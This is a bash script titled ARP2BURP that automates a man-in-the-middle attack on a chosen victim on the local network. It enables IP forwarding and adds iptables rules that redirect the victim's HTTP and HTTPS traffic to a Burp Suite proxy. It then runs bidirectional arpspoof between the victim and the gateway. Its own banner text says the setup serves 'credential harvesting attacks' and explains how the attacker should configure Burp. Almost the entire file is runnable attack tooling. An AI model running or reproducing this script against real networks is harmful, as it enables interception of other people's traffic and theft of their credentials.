#!/bin/bash
#Author: Nox
#Date: 02/05/2020
#Version: 1.0

print_banner() {
echo "               ____    ____     __      ___    _    _  ____    ____    "    
echo "        /\    |  __ \ |  __ \  |__ \   |  _ \ | |  | ||  __ \ |  __ \  "
echo '       /  \   | |__) || |__) |    ) |  | |_) || |  | || |__) || |__) | '
echo "      / /\ \  |  _  / |  ___/    / /   |  _ < | |  | ||  _  / |  ___/  "
echo "     / ____ \ | | \ \ | |       / /_   | |_) || |__| || | \ \ | |      "     
echo "    /_/    \_\|_|  \_\|_|      |____|  |____/  \____/ |_|  \_\|_|      " 
echo -e "                                 by \e[34mNox\e[0m                                "
} 

print_burpconfig() {
echo -e "\e[32m################################################################################\e[0m"
echo -e "\e[32m#\e[0mDescription: This will enable your attacking machine to route traffic. This   \e[32m#\e[0m"
echo -e "\e[32m#\e[0mway, when your victim machine makes a request to an external HTTP server you  \e[32m#\e[0m"
echo -e "\e[32m#\e[0mwill forward the request and intercept the server’s response. This behavior   \e[32m#\e[0m"
echo -e "\e[32m#\e[0mis necessary for credential harvesting attacks. In order to use this script   \e[32m#\e[0m"
echo -e "\e[32m#\e[0meffective the attacker should configure burp suite as follows:                \e[32m#\e[0m"
echo -e "\e[32m#                                                                              #\e[0m"
echo -e "\e[32m#\e[0mStep 1: Click on the proxy tab and then click on the options sub-tab.         \e[32m#\e[0m"
echo -e "\e[32m#                                                                              #\e[0m"
echo -e "\e[32m#\e[0mStep 2: Click the add button and type ‘8080’ for the bind port.               \e[32m#\e[0m"
echo -e "\e[32m#                                                                              #\e[0m"
echo -e "\e[32m#\e[0mStep 3: Select the all interfaces radio button.                               \e[32m#\e[0m"
echo -e "\e[32m#                                                                              #\e[0m"
echo -e "\e[32m#\e[0mStep 4: Click on the request handling tab and check the invisible proxy       \e[32m#\e[0m" 
echo -e "\e[32m#\e[0msupport box.                                                                  \e[32m#\e[0m"
echo -e "\e[32m#                                                                              #\e[0m"
echo -e "\e[32m#\e[0mStep 5: If you've purchased or otherwise acquired an SSL certificate you can  \e[32m#\e[0m"
echo -e "\e[32m#\e[0mconfigure it on the certificate tab. If not, leave those settings the way     \e[32m#\e[0m"
echo -e "\e[32m#\e[0mthey are.                                                                     \e[32m#\e[0m"
echo -e "\e[32m################################################################################\e[0m"
}

exit_script() {
    clear
    print_banner
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "\e[31m[-]\e[0m - sysctl ipv4.forward flag reseted to 0"
    sleep 1
    sudo iptables -F
    echo -e "\e[31m[-]\e[0m - iptables rules have been flushed"
    sleep 1
    echo -e "\e[32m[+]\e[0m - BYE !"
    sleep 2
    trap - SIGINT SIGTERM # clear the trap
    kill -- -$$ # Sends SIGTERM to child/sub processes
}
clear
print_banner
print_burpconfig
echo -e "\e[34m[\e[5mi\e[25m]\e[0m - \e[1mUse CTRL-C to exit\e[0m"
sleep 1
echo ""
echo -e "\e[33m[*]\e[0m - Please enter the interface (ex: wlan0/eth0):"
read -r attackerint
echo -e "\e[33m[*]\e[0m - Please enter Gateway's IP address:"
read -r defgateway
echo -e "\e[33m[*]\e[0m - Please enter the victim's IP address:"
read -r victimip
echo -e "\e[33m[*]\e[0m - Please enter the HTTP proxy port (Press ENTER for default: 8080):"
read -r burpproxyport


#Set the default HTTP proxy port to 8080
if [ -z "$burpproxyport" ]
then
      burpproxyport=8080
      echo -e "\e[32m[+]\e[0m - Using default Proxy Port - $burpproxyport"
      sleep 1
else
      echo -e "\e[32m[+]\e[0m - HTTP Proxy Port set to $burpproxyport"
      sleep 1
fi
echo -e "\e[32m[+]\e[0m - Setting up sysctl ipv4.forward flag"
sleep 1
echo 1 > /proc/sys/net/ipv4/ip_forward
#
#This creates two firewall rules which will redirect all traffic requests
#to port 80 and 443 to the Proxy Port.
sudo iptables -A FORWARD --in-interface "$attackerint" -j ACCEPT
echo -e "\e[32m[+]\e[0m - Setting up iptables FORWARD rule for interface $attackerint"
sleep 1
sudo iptables -t nat -A PREROUTING -i "$attackerint" -p tcp --dport 80 -j REDIRECT --to-port "$burpproxyport"
echo -e "\e[32m[+]\e[0m - Setting up iptables rule to redirect all port 80 traffic to $burpproxyport"
sleep 1
sudo iptables -t nat -A PREROUTING -i "$attackerint" -p tcp --dport 443 -j REDIRECT --to-port "$burpproxyport"
echo -e "\e[32m[+]\e[0m - Setting up iptables rule to redirect all port 443 traffic to $burpproxyport"
sleep 1

#
#This affectively causes the victim to think that you are their primary gateway
#(trap 'kill 0' SIGINT;  arpspoof -i "$attackerint" -t "$victimip" "$defgateway" & arpspoof -i "$attackerint" -t "$defgateway" "$victimip")
echo -e "\e[32m[+]\e[0m - Performing ARP spoofing"
sleep 2
echo -e "\e[32m[+]\e[0m - On going - IP Victim: $victimip  Gateway: $defgateway "
(trap exit_script SIGINT SIGTERM;  arpspoof -i "$attackerint" -t "$victimip" "$defgateway" & arpspoof -i "$attackerint" -t "$defgateway" "$victimip")